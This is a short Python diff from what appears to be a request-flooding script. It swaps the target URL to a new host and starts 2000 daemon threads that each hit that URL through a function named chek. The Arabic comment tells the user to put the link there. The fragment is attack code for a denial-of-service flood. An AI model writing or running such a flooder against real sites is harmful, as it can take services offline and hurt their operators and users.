@@ -25,7 +25,7 @@ def chek(url):
             print("Request failed")
 
 def start_threads():
-    target_url = "https://my-panel.x10.mx"  # ضع الرابط هنا
+    target_url = "https://b3r.panle.xyz/connect"  # ضع الرابط هنا
     for _ in range(2000):
         thread = threading.Thread(target=chek, args=(target_url,))
         thread.daemon = True
